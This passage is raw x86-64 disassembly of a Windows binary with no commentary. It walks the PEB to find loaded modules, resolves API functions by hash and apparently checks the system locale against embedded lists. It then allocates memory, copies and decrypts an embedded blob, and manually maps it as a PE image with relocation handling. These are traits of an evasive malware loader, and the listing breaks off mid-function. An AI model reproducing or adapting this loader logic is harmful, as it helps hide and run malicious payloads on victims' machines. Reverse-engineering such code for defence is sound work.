   140005b04:	74 13                	je     0x140005b19
   140005b06:	48 85 d2             	test   %rdx,%rdx
   140005b09:	41 8d 49 01          	lea    0x1(%r9),%ecx
   140005b0d:	41 0f 44 c9          	cmove  %r9d,%ecx
   140005b11:	44 8b c9             	mov    %ecx,%r9d
   140005b14:	83 f9 02             	cmp    $0x2,%ecx
   140005b17:	76 d7                	jbe    0x140005af0
   140005b19:	33 c0                	xor    %eax,%eax
   140005b1b:	c3                   	ret
   140005b1c:	48 8b c2             	mov    %rdx,%rax
   140005b1f:	c3                   	ret
   140005b20:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140005b27:	00 00 
   140005b29:	48 85 c0             	test   %rax,%rax
   140005b2c:	74 4b                	je     0x140005b79
   140005b2e:	4c 8b 40 18          	mov    0x18(%rax),%r8
   140005b32:	4d 85 c0             	test   %r8,%r8
   140005b35:	74 42                	je     0x140005b79
   140005b37:	49 8b 40 20          	mov    0x20(%r8),%rax
   140005b3b:	49 83 c0 20          	add    $0x20,%r8
   140005b3f:	33 c9                	xor    %ecx,%ecx
   140005b41:	49 3b c0             	cmp    %r8,%rax
   140005b44:	74 33                	je     0x140005b79
   140005b46:	45 33 c9             	xor    %r9d,%r9d
   140005b49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005b50:	48 8b 50 20          	mov    0x20(%rax),%rdx
   140005b54:	48 85 d2             	test   %rdx,%rdx
   140005b57:	74 05                	je     0x140005b5e
   140005b59:	83 f9 01             	cmp    $0x1,%ecx
   140005b5c:	74 1e                	je     0x140005b7c
   140005b5e:	48 8b 00             	mov    (%rax),%rax
   140005b61:	49 3b c0             	cmp    %r8,%rax
   140005b64:	74 13                	je     0x140005b79
   140005b66:	48 85 d2             	test   %rdx,%rdx
   140005b69:	41 8d 49 01          	lea    0x1(%r9),%ecx
   140005b6d:	41 0f 44 c9          	cmove  %r9d,%ecx
   140005b71:	44 8b c9             	mov    %ecx,%r9d
   140005b74:	83 f9 01             	cmp    $0x1,%ecx
   140005b77:	76 d7                	jbe    0x140005b50
   140005b79:	33 c0                	xor    %eax,%eax
   140005b7b:	c3                   	ret
   140005b7c:	48 8b c2             	mov    %rdx,%rax
   140005b7f:	c3                   	ret
   140005b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005b85:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140005b8a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005b8f:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140005b93:	57                   	push   %rdi
   140005b94:	41 54                	push   %r12
   140005b96:	41 55                	push   %r13
   140005b98:	41 56                	push   %r14
   140005b9a:	41 57                	push   %r15
   140005b9c:	48 83 ec 20          	sub    $0x20,%rsp
   140005ba0:	48 8b f1             	mov    %rcx,%rsi
   140005ba3:	48 85 c9             	test   %rcx,%rcx
   140005ba6:	74 6e                	je     0x140005c16
   140005ba8:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140005bad:	66 39 01             	cmp    %ax,(%rcx)
   140005bb0:	75 64                	jne    0x140005c16
   140005bb2:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140005bb6:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140005bbd:	75 57                	jne    0x140005c16
   140005bbf:	8b ac 08 88 00 00 00 	mov    0x88(%rax,%rcx,1),%ebp
   140005bc6:	48 03 e9             	add    %rcx,%rbp
   140005bc9:	74 4b                	je     0x140005c16
   140005bcb:	44 8b 7d 20          	mov    0x20(%rbp),%r15d
   140005bcf:	33 db                	xor    %ebx,%ebx
   140005bd1:	44 8b 65 1c          	mov    0x1c(%rbp),%r12d
   140005bd5:	4c 03 f9             	add    %rcx,%r15
   140005bd8:	44 8b 6d 24          	mov    0x24(%rbp),%r13d
   140005bdc:	4c 03 e1             	add    %rcx,%r12
   140005bdf:	4c 03 e9             	add    %rcx,%r13
   140005be2:	39 5d 18             	cmp    %ebx,0x18(%rbp)
   140005be5:	76 2f                	jbe    0x140005c16
   140005be7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140005bee:	00 00 
   140005bf0:	41 8b 3c 9f          	mov    (%r15,%rbx,4),%edi
   140005bf4:	48 03 fe             	add    %rsi,%rdi
   140005bf7:	48 8b cf             	mov    %rdi,%rcx
   140005bfa:	e8 51 fe ff ff       	call   0x140005a50
   140005bff:	8b d0                	mov    %eax,%edx
   140005c01:	48 8b cf             	mov    %rdi,%rcx
   140005c04:	e8 47 00 00 00       	call   0x140005c50
   140005c09:	3b 44 24 58          	cmp    0x58(%rsp),%eax
   140005c0d:	74 26                	je     0x140005c35
   140005c0f:	ff c3                	inc    %ebx
   140005c11:	3b 5d 18             	cmp    0x18(%rbp),%ebx
   140005c14:	72 da                	jb     0x140005bf0
   140005c16:	33 c0                	xor    %eax,%eax
   140005c18:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005c1d:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140005c22:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005c27:	48 83 c4 20          	add    $0x20,%rsp
   140005c2b:	41 5f                	pop    %r15
   140005c2d:	41 5e                	pop    %r14
   140005c2f:	41 5d                	pop    %r13
   140005c31:	41 5c                	pop    %r12
   140005c33:	5f                   	pop    %rdi
   140005c34:	c3                   	ret
   140005c35:	41 0f b7 44 5d 00    	movzwl 0x0(%r13,%rbx,2),%eax
   140005c3b:	41 8b 04 84          	mov    (%r12,%rax,4),%eax
   140005c3f:	48 03 c6             	add    %rsi,%rax
   140005c42:	eb d4                	jmp    0x140005c18
   140005c44:	cc                   	int3
   140005c45:	cc                   	int3
   140005c46:	cc                   	int3
   140005c47:	cc                   	int3
   140005c48:	cc                   	int3
   140005c49:	cc                   	int3
   140005c4a:	cc                   	int3
   140005c4b:	cc                   	int3
   140005c4c:	cc                   	int3
   140005c4d:	cc                   	int3
   140005c4e:	cc                   	int3
   140005c4f:	cc                   	int3
   140005c50:	48 8b c4             	mov    %rsp,%rax
   140005c53:	48 83 ec 58          	sub    $0x58,%rsp
   140005c57:	4c 8b d1             	mov    %rcx,%r10
   140005c5a:	48 85 c9             	test   %rcx,%rcx
   140005c5d:	0f 84 3e 02 00 00    	je     0x140005ea1
   140005c63:	85 d2                	test   %edx,%edx
   140005c65:	0f 8e 36 02 00 00    	jle    0x140005ea1
   140005c6b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005c6f:	bb c2 f8 cd 8e       	mov    $0x8ecdf8c2,%ebx
   140005c74:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005c78:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005c7c:	be 57 a8 36 ee       	mov    $0xee36a857,%esi
   140005c81:	48 89 78 f8          	mov    %rdi,-0x8(%rax)
   140005c85:	bf ae 08 0d d3       	mov    $0xd30d08ae,%edi
   140005c8a:	4c 89 60 f0          	mov    %r12,-0x10(%rax)
   140005c8e:	4c 89 68 e8          	mov    %r13,-0x18(%rax)
   140005c92:	4c 89 70 e0          	mov    %r14,-0x20(%rax)
   140005c96:	41 be 00 01 00 00    	mov    $0x100,%r14d
   140005c9c:	41 3b d6             	cmp    %r14d,%edx
   140005c9f:	4c 89 78 d8          	mov    %r15,-0x28(%rax)
   140005ca3:	41 bf d6 36 1d 7e    	mov    $0x7e1d36d6,%r15d
   140005ca9:	44 0f 4e f2          	cmovle %edx,%r14d
   140005cad:	33 ed                	xor    %ebp,%ebp
   140005caf:	44 8b ed             	mov    %ebp,%r13d
   140005cb2:	45 8d 5e f0          	lea    -0x10(%r14),%r11d
   140005cb6:	45 85 db             	test   %r11d,%r11d
   140005cb9:	0f 88 db 00 00 00    	js     0x140005d9a
   140005cbf:	90                   	nop
   140005cc0:	41 0f 10 0a          	movups (%r10),%xmm1
   140005cc4:	49 8b 4a 08          	mov    0x8(%r10),%rcx
   140005cc8:	49 83 c2 10          	add    $0x10,%r10
   140005ccc:	4c 8b c1             	mov    %rcx,%r8
   140005ccf:	41 03 cf             	add    %r15d,%ecx
   140005cd2:	49 c1 e8 20          	shr    $0x20,%r8
   140005cd6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140005cda:	44 03 c3             	add    %ebx,%r8d
   140005cdd:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   140005ce2:	41 03 c8             	add    %r8d,%ecx
   140005ce5:	66 41 0f 7e c1       	movd   %xmm0,%r9d
   140005cea:	41 c1 c8 10          	ror    $0x10,%r8d
   140005cee:	66 48 0f 7e ca       	movq   %xmm1,%rdx
   140005cf3:	44 33 c1             	xor    %ecx,%r8d
   140005cf6:	41 33 d6             	xor    %r14d,%edx
   140005cf9:	45 33 cd             	xor    %r13d,%r9d
   140005cfc:	41 83 c5 10          	add    $0x10,%r13d
   140005d00:	44 03 cf             	add    %edi,%r9d
   140005d03:	41 03 d1             	add    %r9d,%edx
   140005d06:	41 c1 c9 13          	ror    $0x13,%r9d
   140005d0a:	03 d6                	add    %esi,%edx
   140005d0c:	44 33 ca             	xor    %edx,%r9d
   140005d0f:	41 03 d0             	add    %r8d,%edx
   140005d12:	41 c1 c8 07          	ror    $0x7,%r8d
   140005d16:	44 33 c2             	xor    %edx,%r8d
   140005d19:	41 8d 04 09          	lea    (%r9,%rcx,1),%eax
   140005d1d:	41 c1 c9 0f          	ror    $0xf,%r9d
   140005d21:	44 33 c8             	xor    %eax,%r9d
   140005d24:	42 8d 34 00          	lea    (%rax,%r8,1),%esi
   140005d28:	41 c1 c8 15          	ror    $0x15,%r8d
   140005d2c:	44 33 c6             	xor    %esi,%r8d
   140005d2f:	44 8b fe             	mov    %esi,%r15d
   140005d32:	8b c6                	mov    %esi,%eax
   140005d34:	c1 ce 07             	ror    $0x7,%esi
   140005d37:	41 8d 0c 11          	lea    (%r9,%rdx,1),%ecx
   140005d3b:	c1 c8 17             	ror    $0x17,%eax
   140005d3e:	44 33 f9             	xor    %ecx,%r15d
   140005d41:	41 c1 c9 1b          	ror    $0x1b,%r9d
   140005d45:	45 33 c8             	xor    %r8d,%r9d
   140005d48:	41 8b d0             	mov    %r8d,%edx
   140005d4b:	c1 ca 0d             	ror    $0xd,%edx
   140005d4e:	41 33 c9             	xor    %r9d,%ecx
   140005d51:	41 03 d7             	add    %r15d,%edx
   140005d54:	03 c8                	add    %eax,%ecx
   140005d56:	33 f1                	xor    %ecx,%esi
   140005d58:	41 c1 cf 13          	ror    $0x13,%r15d
   140005d5c:	44 33 fa             	xor    %edx,%r15d
   140005d5f:	03 d6                	add    %esi,%edx
   140005d61:	c1 ce 07             	ror    $0x7,%esi
   140005d64:	33 f2                	xor    %edx,%esi
   140005d66:	42 8d 04 39          	lea    (%rcx,%r15,1),%eax
   140005d6a:	41 c1 cf 0f          	ror    $0xf,%r15d
   140005d6e:	44 33 f8             	xor    %eax,%r15d
   140005d71:	8d 1c 30             	lea    (%rax,%rsi,1),%ebx
   140005d74:	c1 ce 15             	ror    $0x15,%esi
   140005d77:	33 f3                	xor    %ebx,%esi
   140005d79:	8b fb                	mov    %ebx,%edi
   140005d7b:	c1 cb 17             	ror    $0x17,%ebx
   140005d7e:	41 8d 0c 17          	lea    (%r15,%rdx,1),%ecx
   140005d82:	41 c1 cf 1b          	ror    $0x1b,%r15d
   140005d86:	44 33 fe             	xor    %esi,%r15d
   140005d89:	33 f9                	xor    %ecx,%edi
   140005d8b:	44 33 f9             	xor    %ecx,%r15d
   140005d8e:	c1 ce 0d             	ror    $0xd,%esi
   140005d91:	45 3b eb             	cmp    %r11d,%r13d
   140005d94:	0f 8e 26 ff ff ff    	jle    0x140005cc0
   140005d9a:	45 8b e6             	mov    %r14d,%r12d
   140005d9d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005da0:	45 2b e5             	sub    %r13d,%r12d
   140005da3:	44 8b c5             	mov    %ebp,%r8d
   140005da6:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140005dab:	45 85 e4             	test   %r12d,%r12d
   140005dae:	7e 2e                	jle    0x140005dde
   140005db0:	4d 63 c4             	movslq %r12d,%r8
   140005db3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005db8:	49 8b d2             	mov    %r10,%rdx
   140005dbb:	e8 b0 fc ff ff       	call   0x140005a70
   140005dc0:	8b 4c 24 20          	mov    0x20(%rsp),%ecx
   140005dc4:	44 8b 44 24 28       	mov    0x28(%rsp),%r8d
   140005dc9:	41 69 c4 b9 79 37 9e 	imul   $0x9e3779b9,%r12d,%eax
   140005dd0:	33 c8                	xor    %eax,%ecx
   140005dd2:	8b 44 24 24          	mov    0x24(%rsp),%eax
   140005dd6:	41 33 c6             	xor    %r14d,%eax
   140005dd9:	45 33 c5             	xor    %r13d,%r8d
   140005ddc:	eb 08                	jmp    0x140005de6
   140005dde:	8b 44 24 24          	mov    0x24(%rsp),%eax
   140005de2:	8b 4c 24 20          	mov    0x20(%rsp),%ecx
   140005de6:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140005deb:	43 8d 14 07          	lea    (%r15,%r8,1),%edx
   140005def:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140005df4:	03 f1                	add    %ecx,%esi
   140005df6:	4c 8b 64 24 48       	mov    0x48(%rsp),%r12
   140005dfb:	03 f8                	add    %eax,%edi
   140005dfd:	03 5c 24 2c          	add    0x2c(%rsp),%ebx
   140005e01:	44 8b c5             	mov    %ebp,%r8d
   140005e04:	44 8b cd             	mov    %ebp,%r9d
   140005e07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140005e0e:	00 00 
   140005e10:	8d 04 1a             	lea    (%rdx,%rbx,1),%eax
   140005e13:	81 c7 88 6a 3f 24    	add    $0x243f6a88,%edi
   140005e19:	41 03 f8             	add    %r8d,%edi
   140005e1c:	c1 cb 10             	ror    $0x10,%ebx
   140005e1f:	33 d8                	xor    %eax,%ebx
   140005e21:	8b cf                	mov    %edi,%ecx
   140005e23:	c1 cf 13             	ror    $0x13,%edi
   140005e26:	41 2b c9             	sub    %r9d,%ecx
   140005e29:	03 ce                	add    %esi,%ecx
   140005e2b:	41 81 c1 47 86 c8 61 	add    $0x61c88647,%r9d
   140005e32:	33 f9                	xor    %ecx,%edi
   140005e34:	41 81 c0 88 6a 3f 24 	add    $0x243f6a88,%r8d
   140005e3b:	03 c7                	add    %edi,%eax
   140005e3d:	c1 cf 0f             	ror    $0xf,%edi
   140005e40:	33 f8                	xor    %eax,%edi
   140005e42:	8d 14 19             	lea    (%rcx,%rbx,1),%edx
   140005e45:	c1 cb 07             	ror    $0x7,%ebx
   140005e48:	33 da                	xor    %edx,%ebx
   140005e4a:	8d 0c 17             	lea    (%rdi,%rdx,1),%ecx
   140005e4d:	c1 cf 1b             	ror    $0x1b,%edi
   140005e50:	8d 14 18             	lea    (%rax,%rbx,1),%edx
   140005e53:	c1 cb 15             	ror    $0x15,%ebx
   140005e56:	33 da                	xor    %edx,%ebx
   140005e58:	8b f2                	mov    %edx,%esi
   140005e5a:	33 fb                	xor    %ebx,%edi
   140005e5c:	c1 ca 17             	ror    $0x17,%edx
   140005e5f:	c1 cb 0d             	ror    $0xd,%ebx
   140005e62:	33 f1                	xor    %ecx,%esi
   140005e64:	33 dd                	xor    %ebp,%ebx
   140005e66:	33 f9                	xor    %ecx,%edi
   140005e68:	ff c5                	inc    %ebp
   140005e6a:	83 fd 08             	cmp    $0x8,%ebp
   140005e6d:	7c a1                	jl     0x140005e10
   140005e6f:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005e74:	c1 ce 19             	ror    $0x19,%esi
   140005e77:	33 f7                	xor    %edi,%esi
   140005e79:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140005e7e:	c1 ce 15             	ror    $0x15,%esi
   140005e81:	33 f2                	xor    %edx,%esi
   140005e83:	c1 ce 0f             	ror    $0xf,%esi
   140005e86:	33 f3                	xor    %ebx,%esi
   140005e88:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005e8d:	41 33 f6             	xor    %r14d,%esi
   140005e90:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140005e95:	8b c6                	mov    %esi,%eax
   140005e97:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140005e9c:	48 83 c4 58          	add    $0x58,%rsp
   140005ea0:	c3                   	ret
   140005ea1:	33 c0                	xor    %eax,%eax
   140005ea3:	48 83 c4 58          	add    $0x58,%rsp
   140005ea7:	c3                   	ret
   140005ea8:	cc                   	int3
   140005ea9:	cc                   	int3
   140005eaa:	cc                   	int3
   140005eab:	cc                   	int3
   140005eac:	cc                   	int3
   140005ead:	cc                   	int3
   140005eae:	cc                   	int3
   140005eaf:	cc                   	int3
   140005eb0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005eb5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140005eba:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005ebf:	57                   	push   %rdi
   140005ec0:	48 83 ec 20          	sub    $0x20,%rsp
   140005ec4:	e8 f7 fb ff ff       	call   0x140005ac0
   140005ec9:	48 8b d8             	mov    %rax,%rbx
   140005ecc:	48 85 c0             	test   %rax,%rax
   140005ecf:	0f 84 e0 00 00 00    	je     0x140005fb5
   140005ed5:	ba a1 ce 62 53       	mov    $0x5362cea1,%edx
   140005eda:	48 8b c8             	mov    %rax,%rcx
   140005edd:	e8 9e fc ff ff       	call   0x140005b80
   140005ee2:	ba 2a f0 57 42       	mov    $0x4257f02a,%edx
   140005ee7:	48 8b cb             	mov    %rbx,%rcx
   140005eea:	48 8b f8             	mov    %rax,%rdi
   140005eed:	e8 8e fc ff ff       	call   0x140005b80
   140005ef2:	48 8b f0             	mov    %rax,%rsi
   140005ef5:	48 85 ff             	test   %rdi,%rdi
   140005ef8:	0f 84 b7 00 00 00    	je     0x140005fb5
   140005efe:	48 85 c0             	test   %rax,%rax
   140005f01:	0f 84 ae 00 00 00    	je     0x140005fb5
   140005f07:	ff d7                	call   *%rdi
   140005f09:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005f0f:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140005f16:	00 00 
   140005f18:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005f1d:	ba 5a 00 00 00       	mov    $0x5a,%edx
   140005f22:	8b c8                	mov    %eax,%ecx
   140005f24:	8b f8                	mov    %eax,%edi
   140005f26:	ff d6                	call   *%rsi
   140005f28:	85 c0                	test   %eax,%eax
   140005f2a:	7e 2e                	jle    0x140005f5a
   140005f2c:	48 8d 1d cd 60 00 00 	lea    0x60cd(%rip),%rbx        # 0x14000c000
   140005f33:	48 8d 2d d6 60 00 00 	lea    0x60d6(%rip),%rbp        # 0x14000c010
   140005f3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005f40:	48 8b 13             	mov    (%rbx),%rdx
   140005f43:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005f48:	e8 d3 fa ff ff       	call   0x140005a20
   140005f4d:	85 c0                	test   %eax,%eax
   140005f4f:	74 7b                	je     0x140005fcc
   140005f51:	48 83 c3 08          	add    $0x8,%rbx
   140005f55:	48 3b dd             	cmp    %rbp,%rbx
   140005f58:	7c e6                	jl     0x140005f40
   140005f5a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005f60:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005f65:	ba 59 00 00 00       	mov    $0x59,%edx
   140005f6a:	8b cf                	mov    %edi,%ecx
   140005f6c:	ff d6                	call   *%rsi
   140005f6e:	85 c0                	test   %eax,%eax
   140005f70:	7e 28                	jle    0x140005f9a
   140005f72:	48 8d 1d 97 60 00 00 	lea    0x6097(%rip),%rbx        # 0x14000c010
   140005f79:	48 8d 35 a0 60 00 00 	lea    0x60a0(%rip),%rsi        # 0x14000c020
   140005f80:	48 8b 13             	mov    (%rbx),%rdx
   140005f83:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005f88:	e8 93 fa ff ff       	call   0x140005a20
   140005f8d:	85 c0                	test   %eax,%eax
   140005f8f:	74 3b                	je     0x140005fcc
   140005f91:	48 83 c3 08          	add    $0x8,%rbx
   140005f95:	48 3b de             	cmp    %rsi,%rbx
   140005f98:	7c e6                	jl     0x140005f80
   140005f9a:	48 8d 05 c7 10 00 00 	lea    0x10c7(%rip),%rax        # 0x140007068
   140005fa1:	48 8d 0d c8 10 00 00 	lea    0x10c8(%rip),%rcx        # 0x140007070
   140005fa8:	3b 38                	cmp    (%rax),%edi
   140005faa:	74 20                	je     0x140005fcc
   140005fac:	48 83 c0 04          	add    $0x4,%rax
   140005fb0:	48 3b c1             	cmp    %rcx,%rax
   140005fb3:	7c f3                	jl     0x140005fa8
   140005fb5:	33 c0                	xor    %eax,%eax
   140005fb7:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005fbc:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140005fc1:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005fc6:	48 83 c4 20          	add    $0x20,%rsp
   140005fca:	5f                   	pop    %rdi
   140005fcb:	c3                   	ret
   140005fcc:	b8 01 00 00 00       	mov    $0x1,%eax
   140005fd1:	eb e4                	jmp    0x140005fb7
   140005fd3:	cc                   	int3
   140005fd4:	cc                   	int3
   140005fd5:	cc                   	int3
   140005fd6:	cc                   	int3
   140005fd7:	cc                   	int3
   140005fd8:	cc                   	int3
   140005fd9:	cc                   	int3
   140005fda:	cc                   	int3
   140005fdb:	cc                   	int3
   140005fdc:	cc                   	int3
   140005fdd:	cc                   	int3
   140005fde:	cc                   	int3
   140005fdf:	cc                   	int3
   140005fe0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005fe5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005fea:	57                   	push   %rdi
   140005feb:	48 83 ec 20          	sub    $0x20,%rsp
   140005fef:	e8 cc fa ff ff       	call   0x140005ac0
   140005ff4:	ba 39 d3 a4 30       	mov    $0x30a4d339,%edx
   140005ff9:	48 8b c8             	mov    %rax,%rcx
   140005ffc:	48 8b d8             	mov    %rax,%rbx
   140005fff:	e8 7c fb ff ff       	call   0x140005b80
   140006004:	ba b2 61 ec 7d       	mov    $0x7dec61b2,%edx
   140006009:	48 8b cb             	mov    %rbx,%rcx
   14000600c:	48 8b f8             	mov    %rax,%rdi
   14000600f:	e8 6c fb ff ff       	call   0x140005b80
   140006014:	ba 00 08 0a 00       	mov    $0xa0800,%edx
   140006019:	33 c9                	xor    %ecx,%ecx
   14000601b:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140006021:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140006027:	48 8b f0             	mov    %rax,%rsi
   14000602a:	ff d7                	call   *%rdi
   14000602c:	41 b8 00 08 0a 00    	mov    $0xa0800,%r8d
   140006032:	48 8d 15 e7 60 00 00 	lea    0x60e7(%rip),%rdx        # 0x14000c120
   140006039:	48 8b c8             	mov    %rax,%rcx
   14000603c:	48 8b d8             	mov    %rax,%rbx
   14000603f:	e8 2c fa ff ff       	call   0x140005a70
   140006044:	41 b9 80 00 00 00    	mov    $0x80,%r9d
   14000604a:	4c 8d 05 cf 5f 00 00 	lea    0x5fcf(%rip),%r8        # 0x14000c020
   140006051:	ba 00 08 0a 00       	mov    $0xa0800,%edx
   140006056:	48 8b cb             	mov    %rbx,%rcx
   140006059:	e8 b2 ea ff ff       	call   0x140004b10
   14000605e:	48 8b cb             	mov    %rbx,%rcx
   140006061:	e8 2a 00 00 00       	call   0x140006090
   140006066:	33 d2                	xor    %edx,%edx
   140006068:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   14000606e:	48 8b cb             	mov    %rbx,%rcx
   140006071:	48 8b c6             	mov    %rsi,%rax
   140006074:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006079:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000607e:	48 83 c4 20          	add    $0x20,%rsp
   140006082:	5f                   	pop    %rdi
   140006083:	48 ff e0             	rex.W jmp *%rax
   140006086:	cc                   	int3
   140006087:	cc                   	int3
   140006088:	cc                   	int3
   140006089:	cc                   	int3
   14000608a:	cc                   	int3
   14000608b:	cc                   	int3
   14000608c:	cc                   	int3
   14000608d:	cc                   	int3
   14000608e:	cc                   	int3
   14000608f:	cc                   	int3
   140006090:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006095:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000609a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000609f:	57                   	push   %rdi
   1400060a0:	41 54                	push   %r12
   1400060a2:	41 55                	push   %r13
   1400060a4:	41 56                	push   %r14
   1400060a6:	41 57                	push   %r15
   1400060a8:	48 83 ec 40          	sub    $0x40,%rsp
   1400060ac:	4c 63 69 3c          	movslq 0x3c(%rcx),%r13
   1400060b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400060b3:	4c 03 e9             	add    %rcx,%r13
   1400060b6:	33 c0                	xor    %eax,%eax
   1400060b8:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400060bd:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400060c2:	48 8b f1             	mov    %rcx,%rsi
   1400060c5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400060ca:	e8 f1 f9 ff ff       	call   0x140005ac0
   1400060cf:	ba 39 d3 a4 30       	mov    $0x30a4d339,%edx
   1400060d4:	48 8b c8             	mov    %rax,%rcx
   1400060d7:	48 8b d8             	mov    %rax,%rbx
   1400060da:	e8 a1 fa ff ff       	call   0x140005b80
   1400060df:	ba b2 61 ec 7d       	mov    $0x7dec61b2,%edx
   1400060e4:	48 8b cb             	mov    %rbx,%rcx
   1400060e7:	48 8b e8             	mov    %rax,%rbp
   1400060ea:	e8 91 fa ff ff       	call   0x140005b80
   1400060ef:	ba 59 16 4a a5       	mov    $0xa54a1659,%edx
   1400060f4:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400060f9:	48 8b cb             	mov    %rbx,%rcx
   1400060fc:	4c 8b f0             	mov    %rax,%r14
   1400060ff:	e8 7c fa ff ff       	call   0x140005b80
   140006104:	41 8b 55 50          	mov    0x50(%r13),%edx
   140006108:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000610e:	49 8b 4d 30          	mov    0x30(%r13),%rcx
   140006112:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140006118:	ff d5                	call   *%rbp
   14000611a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000611f:	48 8b f8             	mov    %rax,%rdi
   140006122:	48 85 c0             	test   %rax,%rax
   140006125:	75 1c                	jne    0x140006143
   140006127:	41 8b 55 50          	mov    0x50(%r13),%edx
   14000612b:	33 c9                	xor    %ecx,%ecx
   14000612d:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140006133:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140006139:	ff d5                	call   *%rbp
   14000613b:	48 8b f8             	mov    %rax,%rdi
   14000613e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006143:	45 8b 45 50          	mov    0x50(%r13),%r8d
   140006147:	33 d2                	xor    %edx,%edx
   140006149:	48 8b cf             	mov    %rdi,%rcx
   14000614c:	e8 4f f9 ff ff       	call   0x140005aa0
   140006151:	45 8b 45 54          	mov    0x54(%r13),%r8d
   140006155:	48 8b d6             	mov    %rsi,%rdx
   140006158:	48 8b cf             	mov    %rdi,%rcx
   14000615b:	e8 10 f9 ff ff       	call   0x140005a70
   140006160:	48 8b d6             	mov    %rsi,%rdx
   140006163:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006168:	e8 63 03 00 00       	call   0x1400064d0
   14000616d:	49 8b 8d b0 00 00 00 	mov    0xb0(%r13),%rcx
   140006174:	ba ff 0f 00 00       	mov    $0xfff,%edx
   140006179:	48 8b c1             	mov    %rcx,%rax
   14000617c:	48 c1 e8 20          	shr    $0x20,%rax
   140006180:	85 c9                	test   %ecx,%ecx
   140006182:	0f 84 c6 00 00 00    	je     0x14000624e
   140006188:	85 c0                	test   %eax,%eax
   14000618a:	0f 84 be 00 00 00    	je     0x14000624e
   140006190:	4c 8b d7             	mov    %rdi,%r10
   140006193:	4d 2b 55 30          	sub    0x30(%r13),%r10
   140006197:	0f 84 b1 00 00 00    	je     0x14000624e
   14000619d:	44 8b c1             	mov    %ecx,%r8d
   1400061a0:	4c 03 c7             	add    %rdi,%r8
   1400061a3:	49 8d 1c 00          	lea    (%r8,%rax,1),%rbx
   1400061a7:	4c 3b c3             	cmp    %rbx,%r8
   1400061aa:	0f 83 9e 00 00 00    	jae    0x14000624e
   1400061b0:	41 8b 40 04          	mov    0x4(%r8),%eax
   1400061b4:	83 f8 08             	cmp    $0x8,%eax
   1400061b7:	0f 82 91 00 00 00    	jb     0x14000624e
   1400061bd:	48 83 e8 08          	sub    $0x8,%rax
   1400061c1:	4d 8d 48 08          	lea    0x8(%r8),%r9
   1400061c5:	48 d1 e8             	shr    $1,%rax
   1400061c8:	85 c0                	test   %eax,%eax
   1400061ca:	74 72                	je     0x14000623e
   1400061cc:	44 8b d8             	mov    %eax,%r11d
   1400061cf:	90                   	nop
   1400061d0:	41 0f b7 01          	movzwl (%r9),%eax
   1400061d4:	66 85 c0             	test   %ax,%ax
   1400061d7:	74 5b                	je     0x140006234
   1400061d9:	0f b7 c8             	movzwl %ax,%ecx
   1400061dc:	66 23 c2             	and    %dx,%ax
